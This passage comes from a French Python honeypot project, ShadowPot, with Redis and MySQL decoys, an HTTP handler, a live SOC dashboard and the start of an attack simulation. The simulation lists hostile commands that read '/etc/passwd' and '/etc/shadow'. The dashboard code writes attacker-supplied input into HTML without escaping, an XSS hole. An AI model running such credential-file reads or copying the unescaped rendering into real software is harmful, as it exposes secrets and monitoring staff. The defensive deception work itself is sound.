            WebHoneypotHandler.logger.log_event(session_data)

        self.send_response(401)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"error": "Unauthorized", "message": "Identifiants invalides. Incident consigné au SIEM."}).encode("utf-8"))

    def _render_soc_dashboard(self):
        """Dashboard de supervision temps réel accessible directement dans le navigateur."""
        script_dir = os.path.dirname(os.path.abspath(__file__))
        session_file = os.path.join(script_dir, "logs", "sessions.json")
        sessions = []
        if os.path.exists(session_file):
            try:
                with open(session_file, "r", encoding="utf-8") as f:
                    sessions = json.load(f)
            except Exception:
                sessions = []

        html = build_soc_cert_html(sessions, is_live=True)
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))

    def _render_soc_api(self):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        session_file = os.path.join(script_dir, "logs", "sessions.json")
        sessions = []
        if os.path.exists(session_file):
            try:
                with open(session_file, "r", encoding="utf-8") as f:
                    sessions = json.load(f)
            except Exception:
                sessions = []

        unique_ips = list(set(s.get("source_ip") for s in sessions if s.get("source_ip")))
        total_mitre = sum(len(s.get("mitre_alerts", [])) for s in sessions)
        critical_count = sum(1 for s in sessions if any(a.get("severity") == "CRITICAL" for a in s.get("mitre_alerts", [])))

        data = {
            "total_attacks": len(sessions),
            "unique_ips_count": len(unique_ips),
            "total_mitre": total_mitre,
            "critical_count": critical_count,
            "sessions": sessions[-50:]
        }
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(data, ensure_ascii=False).encode("utf-8"))


class WebHoneypot(threading.Thread):
    def __init__(self, host="0.0.0.0", port=8080, logger=None):
        super().__init__()
        self.host = host
        self.port = port
        self.logger = logger
        self.server = None

    def run(self):
        WebHoneypotHandler.logger = self.logger
        try:
            self.server = http.server.HTTPServer((self.host, self.port), WebHoneypotHandler)
            print(f"{Colors.GREEN}[+] Honeypot Web armé sur http://{self.host}:{self.port} (Dashboard SOC: /_soc){Colors.RESET}")
            self.server.serve_forever()
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur Web Honeypot : {e}{Colors.RESET}")


# =============================================================================
# HONEYPOT SERVICE 3 : REDIS DECOY (DÉTECTION D'INJECTION DE CLÉ SSH T1098)
# =============================================================================
class RedisHoneypot(threading.Thread):
    """Piège à botnets exploitant les instances Redis ouvertes (Port 6379)."""
    def __init__(self, host="0.0.0.0", port=6379, logger=None):
        super().__init__()
        self.host = host
        self.port = port
        self.logger = logger
        self.running = True
        self.sock = None

    def run(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(15)
            print(f"{Colors.GREEN}[+] Honeypot Redis NoSQL armé sur {self.host}:{self.port} (Piège SSH Key Injection){Colors.RESET}")

            while self.running:
                try:
                    client_sock, addr = self.sock.accept()
                    t = threading.Thread(target=self.handle_client, args=(client_sock, addr))
                    t.daemon = True
                    t.start()
                except Exception:
                    break
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur Redis Honeypot : {e}{Colors.RESET}")

    def handle_client(self, sock, addr):
        client_ip, client_port = addr[0], addr[1]
        geo = ThreatIntelEnricher.lookup(client_ip)
        display_ip = geo.get("display_ip", client_ip)
        print(f"\n{Colors.RED}{Colors.BOLD}[🚨 REDIS EXPLOITATION ATTEMPT]{Colors.RESET} Connexion depuis {Colors.CYAN}{display_ip}:{client_port}{Colors.RESET} ({geo['country']}, {geo['city']})")

        session_data = {
            "session_id": f"redis-{int(time.time())}-{client_port}",
            "type": "redis_exploit",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": display_ip,
            "raw_ip": client_ip,
            "source_port": client_port,
            "geo": geo,
            "commands": [],
            "mitre_alerts": []
        }

        try:
            while self.running:
                data = sock.recv(1024)
                if not data:
                    break
                cmd_raw = data.decode("utf-8", errors="ignore").strip()
                if not cmd_raw:
                    continue

                session_data["commands"].append({"time": datetime.now().strftime("%H:%M:%S"), "command": cmd_raw})
                print(f"  {Colors.YELLOW}[REDIS CMD]{Colors.RESET} {cmd_raw}")

                # Analyse MITRE T1098 / T1053 sur les commandes Redis malveillantes
                matched = []
                for rule in MITRE_RULES:
                    if re.search(rule["pattern"], cmd_raw, re.IGNORECASE):
                        matched.append(rule)

                for m in matched:
                    session_data["mitre_alerts"].append(m)
                    print(f"    {Colors.RED}{Colors.BOLD}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} {m['desc']}")

                # Réponse RESP Redis standard (+OK ou PONG)
                if "PING" in cmd_raw.upper():
                    sock.sendall(b"+PONG\r\n")
                elif "INFO" in cmd_raw.upper():
                    sock.sendall(b"$82\r\n# Server\r\nredis_version:6.2.6\r\nos:Linux 5.10.0-8-amd64 x86_64\r\ntcp_port:6379\r\nrole:master\r\n\r\n")
                else:
                    sock.sendall(b"+OK\r\n")
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
            if self.logger:
                self.logger.log_event(session_data)


# =============================================================================
# HONEYPOT SERVICE 4 : MYSQL DECOY (DÉTECTION DE BRUTE FORCE T1110)
# =============================================================================
class MySQLHoneypot(threading.Thread):
    """Émet un handshake MySQL valide (Port 3306) et capture les tentatives d'authentification."""
    def __init__(self, host="0.0.0.0", port=3306, logger=None):
        super().__init__()
        self.host = host
        self.port = port
        self.logger = logger
        self.running = True
        self.sock = None

    def run(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(15)
            print(f"{Colors.GREEN}[+] Honeypot MySQL Database armé sur {self.host}:{self.port} (Handshake 5.7.34){Colors.RESET}")

            while self.running:
                try:
                    client_sock, addr = self.sock.accept()
                    t = threading.Thread(target=self.handle_client, args=(client_sock, addr))
                    t.daemon = True
                    t.start()
                except Exception:
                    break
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur MySQL Honeypot : {e}{Colors.RESET}")

    def handle_client(self, sock, addr):
        client_ip, client_port = addr[0], addr[1]
        geo = ThreatIntelEnricher.lookup(client_ip)
        display_ip = geo.get("display_ip", client_ip)
        print(f"\n{Colors.RED}{Colors.BOLD}[🚨 MYSQL PROBE DÉTECTÉE]{Colors.RESET} Connexion entrante depuis {Colors.CYAN}{display_ip}:{client_port}{Colors.RESET} ({geo['country']}, {geo['city']})")

        session_data = {
            "session_id": f"mysql-{int(time.time())}-{client_port}",
            "type": "mysql_auth_attempt",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": display_ip,
            "raw_ip": client_ip,
            "source_port": client_port,
            "geo": geo,
            "auth": {},
            "mitre_alerts": [{
                "id": "T1110",
                "name": "Brute Force (Database)",
                "tactic": "Credential Access",
                "severity": "HIGH",
                "desc": "Tentative de force brute ou connexion non autorisée sur service de base de données MySQL"
            }]
        }

        try:
            # Paquet d'Initial Handshake MySQL v10
            # Protocol: 10, Version: 5.7.34-Debian
            version = b"5.7.34-log\x00"
            thread_id = b"\x01\x00\x00\x00"
            salt1 = b"12345678"
            salt2 = b"123456789012\x00"
            payload = b"\x0a" + version + thread_id + salt1 + b"\x00\xff\xf7\x21\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + salt2 + b"mysql_native_password\x00"
            packet = bytes([len(payload) & 0xff, (len(payload) >> 8) & 0xff, (len(payload) >> 16) & 0xff, 0]) + payload
            sock.sendall(packet)

            # Lecture de la réponse client
            resp = sock.recv(1024)
            if resp and len(resp) > 36:
                user_bytes = resp[36:].split(b"\x00")[0]
                user = user_bytes.decode("utf-8", errors="ignore")
                session_data["auth"] = {"username": user}
                print(f"  {Colors.YELLOW}[MYSQL USER ATTEMPT]{Colors.RESET} Tentative d'accès avec l'utilisateur : {Colors.BOLD}'{user}'{Colors.RESET}")

            # Envoi d'une erreur 1045 (Access Denied)
            err_msg = b"\xff\x15\x04#28000Access denied for user"
            err_packet = bytes([len(err_msg) & 0xff, 0, 0, 2]) + err_msg
            sock.sendall(err_packet)
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
            if self.logger:
                self.logger.log_event(session_data)


# =============================================================================
# GÉNÉRATEUR DE RAPPORT FORENSIQUE & DASHBOARD (SOC CERT WHITE DESIGN ÉPURÉ)
# =============================================================================
def build_soc_cert_html(sessions, is_live=False):
    """Génère le dashboard SOC épuré en design blanc avec alertes en temps réel."""
    total_attacks = len(sessions)
    unique_ips = len(set(s.get("source_ip") for s in sessions if s.get("source_ip")))
    mitre_count = sum(len(s.get("mitre_alerts", [])) for s in sessions)
    critical_count = sum(1 for s in sessions if any(a.get("severity") == "CRITICAL" for a in s.get("mitre_alerts", [])))

    rows = ""
    for s in reversed(sessions):
        sip = s.get("source_ip", "Inconnu")
        geo = s.get("geo") or {}
        code = (geo.get("country_code") or "").upper()
        flag = "🇧🇯" if code == "BJ" else "🇫🇷" if code == "FR" else "🇩🇪" if code == "DE" else "🇳🇱" if code == "NL" else "🇷🇺" if code == "RU" else "🇺🇸" if code == "US" else "🌐"
        country = geo.get("country", "Bénin")
        city = geo.get("city", "Cotonou")
        isp = geo.get("isp", "SOCIETE BENINOISE D'INFRASTRUCTURES NUMERIQUES")
        stype = s.get("type", "Inconnu")
        stime = s.get("timestamp", "")[:19].replace("T", " ")

        if stype == "shell":
            vec_badge = '<span class="vector-tag vec-ssh">SSH (2222)</span>'
        elif "web" in stype:
            vec_badge = '<span class="vector-tag vec-web">WEB (8080)</span>'
        elif "redis" in stype:
            vec_badge = '<span class="vector-tag vec-redis">REDIS (6379)</span>'
        elif "mysql" in stype:
            vec_badge = '<span class="vector-tag vec-mysql">MYSQL (3306)</span>'
        else:
            vec_badge = f'<span class="vector-tag">{stype.upper()}</span>'

        alerts_html = ""
        for a in s.get("mitre_alerts", []):
            sev = a.get("severity", "LOW")
            sev_class = "crit" if sev == "CRITICAL" else "high" if sev == "HIGH" else "med" if sev == "MEDIUM" else "low"
            alerts_html += f'<span class="ttp-badge {sev_class}">[{a["id"]}] {a["name"]}</span>'

        cmds_html = ""
        if s.get("auth"):
            u = s['auth'].get('username', '')
            p = s['auth'].get('password', '')
            if u or p:
                cmds_html += f"<div class='auth-box'><strong>AUTH CAPTURÉE :</strong> user='{u}' | pass='{p}'</div>"

        for c in s.get("commands", []):
            cmd_val = c.get("command") if isinstance(c, dict) else c
            cmds_html += f"<div class='code-box'>$ {cmd_val}</div>"

        if s.get("body"):
            cmds_html += f"<div class='code-box'>PAYLOAD: {s.get('body')}</div>"

        activity_cell = cmds_html if cmds_html else '<em style="color:#94a3b8">Sonde réseau d\'exploration</em>'
        alerts_cell = alerts_html if alerts_html else '<em style="color:#94a3b8">Activité d\'exploration</em>'

        rows += f"""
        <tr>
            <td><small style="color:#64748b; font-weight:600;">{stime} UTC</small></td>
            <td>
                <div class="ip-box">{sip}</div>
                <div class="geo-pill">{flag} <strong>{city}, {country}</strong></div>
                <div class="isp-text">{isp}</div>
            </td>
            <td>{vec_badge}</td>
            <td>{activity_cell}</td>
            <td>{alerts_cell}</td>
        </tr>"""

    table_body = rows if rows else '<tr><td colspan="5" style="text-align:center; padding:35px; color:#94a3b8;">En attente d\'attaques... Lancez une commande de test sur un leurre pour la voir apparaître ici en direct.</td></tr>'

    live_script = """
    <script>
    let lastAttackCount = -1;
    function showToast(msg) {
        const t = document.getElementById('toast');
        if (!t) return;
        t.textContent = msg;
        t.classList.add('show');
        setTimeout(() => t.classList.remove('show'), 3500);
    }

    async function pollLiveEvents() {
        try {
            const resp = await fetch('/_soc/api/events');
            if (!resp.ok) return;
            const data = await resp.json();

            // Mise à jour des compteurs
            document.getElementById('kpi-total').textContent = data.total_attacks;
            document.getElementById('kpi-ips').textContent = data.unique_ips_count;
            document.getElementById('kpi-mitre').textContent = data.total_mitre;
            document.getElementById('kpi-crit').textContent = data.critical_count;
            document.getElementById('hero-total').textContent = data.total_attacks + ' intrusions interceptées';

            // Alerte notification en cas de nouvelle attaque
            if (lastAttackCount !== -1 && data.total_attacks > lastAttackCount) {
                const diff = data.total_attacks - lastAttackCount;
                showToast(`🚨 ${diff} nouvelle(s) intrusion(s) interceptée(s) par ShadowPot !`);
            }
            lastAttackCount = data.total_attacks;

            // Rendu du tableau en temps réel
            const tbody = document.getElementById('events-tbody');
            if (!data.sessions || data.sessions.length === 0) {
                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:35px; color:#94a3b8;">En attente d\\'attaques... Lancez une commande de test sur un leurre pour la voir apparaître ici en direct.</td></tr>';
                return;
            }

            let html = '';
            for (let i = data.sessions.length - 1; i >= 0; i--) {
                const s = data.sessions[i];
                const geo = s.geo || {};
                const code = (geo.country_code || '').toUpperCase();
                const flag = code === 'BJ' ? '🇧🇯' : code === 'FR' ? '🇫🇷' : code === 'DE' ? '🇩🇪' : code === 'NL' ? '🇳🇱' : code === 'RU' ? '🇷🇺' : code === 'US' ? '🇺🇸' : '🌐';
                const country = geo.country || 'Bénin';
                const city = geo.city || 'Cotonou';
                const isp = geo.isp || 'SBIN Bénin';
                const sip = s.source_ip || '127.0.0.1';
                const stype = s.type || 'unknown';
                const stime = (s.timestamp || '').slice(0, 19).replace('T', ' ');

                let vecBadge = '';
                if (stype === 'shell') vecBadge = '<span class="vector-tag vec-ssh">SSH (2222)</span>';
                else if (stype.includes('web')) vecBadge = '<span class="vector-tag vec-web">WEB (8080)</span>';
                else if (stype.includes('redis')) vecBadge = '<span class="vector-tag vec-redis">REDIS (6379)</span>';
                else if (stype.includes('mysql')) vecBadge = '<span class="vector-tag vec-mysql">MYSQL (3306)</span>';
                else vecBadge = '<span class="vector-tag">' + stype.toUpperCase() + '</span>';

                let alerts = '';
                (s.mitre_alerts || []).forEach(a => {
                    const sev = a.severity || 'LOW';
                    const cls = sev === 'CRITICAL' ? 'crit' : sev === 'HIGH' ? 'high' : sev === 'MEDIUM' ? 'med' : 'low';
                    alerts += `<span class="ttp-badge ${cls}">[${a.id}] ${a.name}</span>`;
                });

                let cmds = '';
                if (s.auth && (s.auth.username || s.auth.password)) {
                    cmds += `<div class="auth-box"><strong>AUTH CAPTURÉE :</strong> user='${s.auth.username||""}' | pass='${s.auth.password||""}'</div>`;
                }
                (s.commands || []).forEach(c => {
                    const cmdVal = typeof c === 'object' ? c.command : c;
                    cmds += `<div class="code-box">$ ${cmdVal}</div>`;
                });
                if (s.body) {
                    cmds += `<div class="code-box">PAYLOAD: ${s.body}</div>`;
                }
                if (!cmds) cmds = '<em style="color:#94a3b8">Sonde réseau d\\'exploration</em>';

                html += `<tr>
                    <td><small style="color:#64748b; font-weight:600;">${stime} UTC</small></td>
                    <td>
                        <div class="ip-box">${sip}</div>
                        <div class="geo-pill">${flag} <strong>${city}, ${country}</strong></div>
                        <div class="isp-text">${isp}</div>
                    </td>
                    <td>${vecBadge}</td>
                    <td>${cmds}</td>
                    <td>${alerts || '<em style="color:#94a3b8">Activité d\\'exploration</em>'}</td>
                </tr>`;
            }
            tbody.innerHTML = html;
        } catch (e) {
            console.error('Erreur polling live:', e);
        }
    }

    // Polling toutes les 1.5 secondes en temps réel sans rechargement
    setInterval(pollLiveEvents, 1500);
    pollLiveEvents();

    function copyIocs() {
        fetch('/_soc/iocs').then(r => r.text()).then(txt => {
            navigator.clipboard.writeText(txt).then(() => {
                showToast('✓ Liste noire des IoCs copiée dans le presse-papier !');
            });
        });
    }
    </script>
    """ if is_live else ""

    return f"""<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOC CERT — ShadowPot Deception Grid</title>
    <style>
        :root {{
            --bg: #f8fafc;
            --card-bg: #ffffff;
            --text-main: #0f172a;
            --text-muted: #64748b;
            --border: #e2e8f0;
            --blue: #2563eb;
            --blue-light: #eff6ff;
            --blue-border: #bfdbfe;
            --green: #059669;
            --green-light: #ecfdf5;
            --green-border: #a7f3d0;
            --red: #dc2626;
            --red-light: #fee2e2;
            --red-border: #fecaca;
            --amber: #d97706;
            --amber-light: #fef3c7;
            --amber-border: #fde68a;
        }}
        * {{ box-sizing: border-box; }}
        body {{
            background-color: var(--bg);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            margin: 0;
            padding: 0 0 50px 0;
            -webkit-font-smoothing: antialiased;
        }}
        .topbar {{
            background: #ffffff;
            border-bottom: 1px solid var(--border);
            padding: 14px 32px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }}
        .topbar-left {{
            display: flex;
            align-items: center;
            gap: 14px;
        }}
        .soc-logo {{
            background: #f1f5f9;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 800;
            padding: 4px 8px;
            color: #334155;
            letter-spacing: 0.5px;
        }}
        .soc-brand {{
            font-size: 17px;
            font-weight: 800;
            color: var(--text-main);
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        .live-pill {{
            background: var(--green-light);
            color: var(--green);
            border: 1px solid var(--green-border);
            font-size: 10px;
            font-weight: 700;
            padding: 3px 10px;
            border-radius: 9999px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            text-transform: uppercase;
        }}
        .live-dot {{
            width: 7px;
            height: 7px;
            background: var(--green);
            border-radius: 50%;
            animation: pulse-dot 1.5s infinite;
        }}
        @keyframes pulse-dot {{
            0% {{ transform: scale(0.9); opacity: 0.7; }}
            50% {{ transform: scale(1.3); opacity: 1; }}
            100% {{ transform: scale(0.9); opacity: 0.7; }}
        }}
        .topbar-right {{
            display: flex;
            align-items: center;
            gap: 12px;
        }}
        .btn-action {{
            background: #ffffff;
            border: 1px solid var(--border);
            color: #334155;
            padding: 7px 14px;
            border-radius: 8px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            transition: all 0.15s ease;
        }}
        .btn-action:hover {{
            background: #f8fafc;
            border-color: #cbd5e1;
        }}
        .avatar {{
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: linear-gradient(135deg, #0f766e, #14b8a6);
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 12px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }}
        .container {{
            max-width: 1280px;
            margin: 0 auto;
            padding: 24px 24px;
        }}
        /* HERO STATUS */
        .hero-banner {{
            background: #ffffff;
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px 24px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
        }}
        .hero-left h1 {{
            margin: 0 0 6px 0;
            font-size: 21px;
            font-weight: 800;
            color: var(--text-main);
        }}
        .hero-left p {{
            margin: 0;
            color: var(--text-muted);
            font-size: 13px;
        }}
        .decoys-strip {{
            display: flex;
            gap: 8px;
            margin-top: 10px;
        }}
        .decoy-pill {{
            background: #f8fafc;
            border: 1px solid var(--border);
            padding: 3px 9px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 600;
            color: #475569;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }}
        .decoy-dot {{
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #10b981;
        }}
        /* STATS KPI GRID */
        .stats-grid {{
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 16px;
            margin-bottom: 24px;
        }}
        .stat-card {{
            background: #ffffff;
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 18px 22px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
        }}
        .stat-label {{
            font-size: 11px;
            font-weight: 700;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 6px;
        }}
        .stat-val {{
            font-size: 28px;
            font-weight: 800;
            color: var(--text-main);
            margin-bottom: 2px;
        }}
        .stat-sub {{
            font-size: 12px;
            font-weight: 600;
        }}
        /* SECTION CARD */
        .section-card {{
            background: #ffffff;
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 24px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
        }}
        .section-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }}
        .section-title {{
            font-size: 16px;
            font-weight: 800;
            color: var(--text-main);
            display: flex;
            align-items: center;
            gap: 8px;
        }}
        /* TABLE */
        table {{
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }}
        th {{
            background: #f8fafc;
            color: #475569;
            text-align: left;
            padding: 12px 16px;
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-top: 1px solid var(--border);
            border-bottom: 1px solid var(--border);
        }}
        td {{
            padding: 14px 16px;
            border-bottom: 1px solid #f1f5f9;
            vertical-align: top;
        }}
        tr:hover td {{
            background: #fafafa;
        }}
        .ip-box {{
            font-family: monospace;
            font-weight: 700;
            font-size: 13px;
            color: var(--text-main);
        }}
        .geo-pill {{
            display: inline-flex;
            align-items: center;
            gap: 4px;
            font-size: 11.5px;
            color: #334155;
            margin-top: 3px;
        }}
        .isp-text {{
            font-size: 11px;
            color: #64748b;
            margin-top: 2px;
        }}
        .vector-tag {{
            padding: 3px 8px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 700;
            border: 1px solid transparent;
            display: inline-block;
        }}
        .vec-ssh {{ background: #ecfdf5; color: #065f46; border-color: #a7f3d0; }}
        .vec-web {{ background: #eff6ff; color: #1e40af; border-color: #bfdbfe; }}
        .vec-redis {{ background: #fef2f2; color: #991b1b; border-color: #fecaca; }}
        .vec-mysql {{ background: #fefce8; color: #854d0e; border-color: #fde047; }}
        .code-box {{
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            padding: 5px 9px;
            border-radius: 6px;
            font-family: Consolas, monospace;
            font-size: 12px;
            color: #0f172a;
            max-width: 440px;
            overflow-x: auto;
            margin-bottom: 4px;
        }}
        .auth-box {{
            background: #f1f5f9;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            padding: 4px 8px;
            font-size: 11px;
            margin-bottom: 5px;
            color: #334155;
        }}
        .ttp-badge {{
            display: inline-block;
            padding: 3px 8px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 700;
            margin: 2px 4px 2px 0;
            border: 1px solid transparent;
        }}
        .ttp-badge.crit {{ background: var(--red-light); color: var(--red); border-color: var(--red-border); }}
        .ttp-badge.high {{ background: var(--amber-light); color: var(--amber); border-color: var(--amber-border); }}
        .ttp-badge.med  {{ background: var(--blue-light); color: var(--blue); border-color: var(--blue-border); }}
        .ttp-badge.low  {{ background: #f1f5f9; color: #475569; border-color: #e2e8f0; }}
        /* TOAST ALERT */
        .toast {{
            position: fixed;
            bottom: 24px;
            right: 24px;
            background: #0f172a;
            color: #ffffff;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 600;
            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
            display: none;
            z-index: 1000;
            border-left: 4px solid var(--red);
        }}
        .toast.show {{ display: block; animation: slideIn 0.3s ease; }}
        @keyframes slideIn {{
            from {{ transform: translateY(20px); opacity: 0; }}
            to {{ transform: translateY(0); opacity: 1; }}
        }}
    </style>
</head>
<body>
    <div class="topbar">
        <div class="topbar-left">
            <div class="soc-logo">SOC</div>
            <div>
                <div class="soc-brand">ShadowPot Deception Grid <span class="live-pill"><span class="live-dot"></span> ACTIF TEMPS RÉEL</span></div>
            </div>
        </div>
        <div class="topbar-right">
            <button class="btn-action" onclick="copyIocs()">📋 Copier IoCs Blacklist</button>
            <a href="/_soc/iocs" class="btn-action" download="iocs_blacklist.txt">💾 Télécharger IoCs</a>
            <div class="avatar" title="Tohon Fourier - Lead Cybersécurité">TF</div>
        </div>
    </div>

    <div class="container">
        <!-- HERO STATUS -->
        <div class="hero-banner">
            <div class="hero-left">
                <h1>Console de Déception & Détection d'Intrusions (MITRE ATT&CK)</h1>
                <p>Surveillance active des flux réseau hostiles piégés sur les 4 leurres d'infrastructure.</p>
                <div class="decoys-strip">
                    <span class="decoy-pill"><span class="decoy-dot"></span> SSH Linux (:2222)</span>
                    <span class="decoy-pill"><span class="decoy-dot"></span> Web Admin (:8080)</span>
                    <span class="decoy-pill"><span class="decoy-dot"></span> Redis NoSQL (:6379)</span>
                    <span class="decoy-pill"><span class="decoy-dot"></span> MySQL DB (:3306)</span>
                </div>
            </div>
            <div>
                <span id="hero-total" style="background: var(--blue-light); color: var(--blue); padding: 6px 14px; border-radius: 9999px; font-weight: 700; font-size: 12px;">{total_attacks} intrusions interceptées</span>
            </div>
        </div>

        <!-- STATS KPI GRID -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-label">Total Intrusions Traitées</div>
                <div class="stat-val" id="kpi-total">{total_attacks}</div>
                <div class="stat-sub" style="color: var(--blue);">100% piégées dans les leurres</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Attaquants / IPs Uniques</div>
                <div class="stat-val" id="kpi-ips">{unique_ips}</div>
                <div class="stat-sub" style="color: var(--green);">Résolues GeoIP & FAI</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Techniques MITRE ATT&CK</div>
                <div class="stat-val" id="kpi-mitre">{mitre_count}</div>
                <div class="stat-sub" style="color: var(--amber);">Cartographiées en direct</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Alertes Critiques (T1003/T1098/T1190)</div>
                <div class="stat-val" id="kpi-crit" style="color: var(--red);">{critical_count}</div>
                <div class="stat-sub" style="color: var(--red);">IoC Blacklisté automatiquement</div>
            </div>
        </div>

        <!-- LIVE EVENTS TABLE -->
        <div class="section-card">
            <div class="section-header">
                <div class="section-title">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
                    Flux des Intrusions en Direct & Renseignement Forensique
                </div>
                <span style="font-size: 11px; color: var(--text-muted); font-weight: 600;">Rafraîchissement automatique : 1.5s</span>
            </div>
            <table>
                <thead>
                    <tr>
                        <th style="width: 170px;">HORODATAGE UTC</th>
                        <th style="width: 280px;">IP SOURCE, PAYS & FAI</th>
                        <th style="width: 140px;">LEURRE CIBLÉ</th>
                        <th>ACTIVITÉ HOSTILE & COMMANDES CAPTURÉES</th>
                        <th style="width: 320px;">CLASSIFICATION MITRE ATT&CK</th>
                    </tr>
                </thead>
                <tbody id="events-tbody">
                    {table_body}
                </tbody>
            </table>
        </div>
    </div>

    <div id="toast" class="toast"></div>

    {live_script}
</body>
</html>"""


# =============================================================================
# GÉNÉRATEUR DE RAPPORT FORENSIQUE SOC SUR FICHIER DISQUE
# =============================================================================
def generate_incident_report(log_dir=None, report_path=None):
    if log_dir is None:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        log_dir = os.path.join(script_dir, "logs")
    if report_path is None:
        report_path = os.path.join(log_dir, "rapport_incidents.html")
    session_file = os.path.join(log_dir, "sessions.json")
    if not os.path.exists(session_file):
        print(f"{Colors.YELLOW}[i] Aucun journal de session trouvé pour générer le rapport.{Colors.RESET}")
        return

    try:
        with open(session_file, "r", encoding="utf-8") as f:
            sessions = json.load(f)
    except Exception:
        sessions = []

    html = build_soc_cert_html(sessions, is_live=False)

    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html)
    print(f"\n{Colors.GREEN}[✓] Rapport forensique HTML mis à jour avec succès :{Colors.RESET} {report_path}")


# =============================================================================
# BANC D'ESSAI COMPARATIF & DÉMONSTRATION COMPLÈTE (4 VECTEURS RÉELS)
# =============================================================================
def run_simulation(logger):
    """Exécute 4 campagnes d'attaques réalistes pour valider l'ensemble des leurres."""
    print(f"\n{Colors.MAGENTA}{Colors.BOLD}=== SIMULATION FORENSIQUE OFFENSIVE SHADOWPOT v2.0 (4 SCÉNARIOS) ==={Colors.RESET}\n")

    # Scénario 1 : Compromission Shell Linux & Enchaînement de TTPs
    print(f"{Colors.ORANGE}{Colors.BOLD}--- SCÉNARIO 1 : INTRUSION SHELL LINUX & DÉTOURNEMENT SYSTÈME ---{Colors.RESET}")
    attacker_ip = "185.220.101.5"
    attacker_port = 48210
    geo1 = {"country": "Allemagne (Tor Exit Node)", "country_code": "DE", "city": "Frankfurt", "isp": "Tor Anonymity Router", "threat_level": "Tor"}

    print(f"{Colors.RED}{Colors.BOLD}[🚨 INTRUSION SHELL]{Colors.RESET} Connexion entrante depuis {Colors.CYAN}{attacker_ip}:{attacker_port}{Colors.RESET} ({geo1['country']})")
    time.sleep(0.3)
    print(f"  {Colors.YELLOW}[AUTH BRUTE-FORCE]{Colors.RESET} Identifiants capturés : {Colors.BOLD}user='root', pass='toor123'{Colors.RESET}")

    session_id = f"shell-{int(time.time())}-{attacker_port}"
    session_data = {
        "session_id": session_id,
        "type": "shell",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source_ip": attacker_ip,
        "source_port": attacker_port,
        "geo": geo1,
        "auth": {"username": "root", "password": "toor123"},
        "commands": [],
        "mitre_alerts": []
    }

    test_commands = [
        ("whoami", "Découverte des privilèges"),
        ("uname -a", "Reconnaissance du noyau"),
        ("cat /etc/passwd", "Vol de comptes système"),
        ("cat /etc/shadow", "Extraction de hashs critiques"),
